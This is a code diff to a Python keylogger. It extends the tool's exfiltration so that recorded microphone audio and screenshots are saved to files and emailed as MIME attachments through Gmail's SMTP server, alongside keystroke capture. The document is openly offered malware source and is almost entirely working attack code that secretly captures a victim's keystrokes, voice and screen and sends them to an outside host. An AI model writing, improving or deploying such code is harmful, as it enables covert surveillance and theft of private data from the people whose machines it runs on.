@@ -63,22 +63,45 @@ finally:
 
             self.appendlog(current_key)
 
-        def send_mail(email, password, message):
+        def send_mail(self, email, password, message, attachment_path=None):
             sender = f"Private Person <{email}>"
             receiver = "A Test User <to@example.com>"
-
-            m = f"""\
-            Subject: main Mailtrap
-            To: {receiver}
-            From: {sender}
-
-            Keylogger by aydinnyunus\n"""
-
-            m += message
+            
+            # Create message container
+            msg = MIMEMultipart()
+            msg['Subject'] = "main Mailtrap"
+            msg['From'] = sender
+            msg['To'] = receiver
+            
+            # Email body
+            body = f"Keylogger by aydinnyunus\n\n{message}"
+            msg.attach(MIMEText(body, 'plain'))
+            
+            # Attach file if provided
+            if attachment_path and os.path.exists(attachment_path):
+                filename = os.path.basename(attachment_path)
+                
+                # Open file in binary mode
+                with open(attachment_path, 'rb') as attachment:
+                    part = MIMEBase('application', 'octet-stream')
+                    part.set_payload(attachment.read())
+                
+                # Encode to base64
+                encoders.encode_base64(part)
+                
+                # Add header
+                part.add_header(
+                    'Content-Disposition',
+                    f'attachment; filename= {filename}',
+                )
+                
+                msg.attach(part)
+            
+            # Send email
             with smtplib.SMTP("smtp.gmail.com", 587) as server:
                 server.starttls()
                 server.login(email, password)
-                server.sendmail(sender, receiver, m)
+                server.sendmail(sender, receiver, msg.as_string())
 
         def report(self):
             try:
@@ -105,19 +128,40 @@ finally:
         def microphone(self):
             fs = 44100
             seconds = SEND_REPORT_EVERY
-            obj = wave.open('sound.wav', 'w')
-            obj.setnchannels(1)  # mono
+            file_path = '/home/kali/Desktop/sound.wav'  # Full path
+            
+            # Record audio
+            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
+            sd.wait()
+            
+            # Save to file
+            obj = wave.open(file_path, 'w')
+            obj.setnchannels(1)
             obj.setsampwidth(2)
             obj.setframerate(fs)
-            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
             obj.writeframesraw(myrecording)
-            sd.wait()
+            obj.close()
+            
+            # Send email
+            self.send_mail(
+                email=EMAIL_ADDRESS, 
+                password=EMAIL_PASSWORD, 
+                message="Microphone recording from keylogger",
+                attachment_path=file_path
+            )
 
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
+        import datetime
 
         def screenshot(self):
             img = pyscreenshot.grab()
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
+            img.save('screenshot.png')  # Save the image first
+            
+            self.send_mail(
+                email=EMAIL_ADDRESS, 
+                password=EMAIL_PASSWORD, 
+                message="Screenshot attached",
+                attachment_path='screenshot.png'  # Pass the file path
+            )
 
         def run(self):
             keyboard_listener = keyboard.Listener(on_press=self.save_data)
